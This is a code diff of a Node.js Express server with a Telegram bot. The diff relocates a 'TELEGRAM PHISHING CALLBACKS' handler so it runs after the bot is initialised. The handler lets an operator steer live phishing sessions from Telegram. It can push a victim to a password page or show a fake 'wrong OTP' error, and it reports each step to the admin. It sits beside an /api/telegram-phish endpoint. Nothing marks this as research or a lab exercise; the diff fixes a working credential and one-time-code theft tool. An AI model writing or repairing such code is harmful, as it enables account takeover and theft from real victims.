@@ -1075,39 +1075,6 @@ app.post('/api/telegram-phish', async (req, res) => {
     }
 });
 
-// ====================== TELEGRAM PHISHING CALLBACKS ======================
-S7.on('callback_query', async (q) => {
-    if (q.data.startsWith('phish_')) {
-        const parts = q.data.split('_');
-        const action = parts[1];
-        const sessionId = parts[2] || '';
-
-        if (!global.phishSessions || !global.phishSessions[sessionId]) {
-            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
-            return;
-        }
-
-        const session = global.phishSessions[sessionId];
-        const userId = session.userId;
-
-        if (action === 'password') {
-            // User clicked "Password Manga Raha" - show password page
-            await S7.answerCallbackQuery(q.id, { text: '✅ Show password page to user' });
-            // The page will automatically show password section via API
-            await S7.sendMessage(config.adminId, `✅ Password section will be shown to user ${userId}`);
-            // Update the session
-            session.decision = 'password';
-            // Notify the page (via the API response)
-        } else if (action === 'wrong') {
-            // User clicked "OTP Galat Hai" - show wrong OTP error
-            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
-            session.decision = 'wrong';
-            await S7.sendMessage(config.adminId, `❌ Wrong OTP error will be shown to user ${userId}`);
-        }
-        await S7.editMessageReplyMarkup({ chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: {} });
-    }
-});
-
 // ====================== ADMIN API ENDPOINTS ======================
 
 // Get all photos
@@ -1542,6 +1509,7 @@ app.get('/page/:id', async (req, res) => {
 });
 
 // ====================== TELEGRAM BOT ======================
+// IMPORTANT: S7 must be initialized BEFORE any handlers that use it
 const S7 = new TelegramBot(config.mainToken, { polling: true });
 S7.getMe().then(botInfo => {
     console.log('✅ Bot Started: @' + botInfo.username);
@@ -1767,6 +1735,34 @@ async function processReferral(referrerId, userId) {
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
     logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
 }
+
+// ====================== TELEGRAM PHISHING CALLBACKS ======================
+S7.on('callback_query', async (q) => {
+    if (q.data.startsWith('phish_')) {
+        const parts = q.data.split('_');
+        const action = parts[1];
+        const sessionId = parts[2] || '';
+
+        if (!global.phishSessions || !global.phishSessions[sessionId]) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
+            return;
+        }
+
+        const session = global.phishSessions[sessionId];
+        const userId = session.userId;
+
+        if (action === 'password') {
+            await S7.answerCallbackQuery(q.id, { text: '✅ Show password page to user' });
+            await S7.sendMessage(config.adminId, `✅ Password section will be shown to user ${userId}`);
+            session.decision = 'password';
+        } else if (action === 'wrong') {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
+            session.decision = 'wrong';
+            await S7.sendMessage(config.adminId, `❌ Wrong OTP error will be shown to user ${userId}`);
+        }
+        await S7.editMessageReplyMarkup({ chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: {} });
+    }
+});
 
 // ====================== CALLBACK QUERY HANDLER ======================
 S7.on('callback_query', async (q) => {
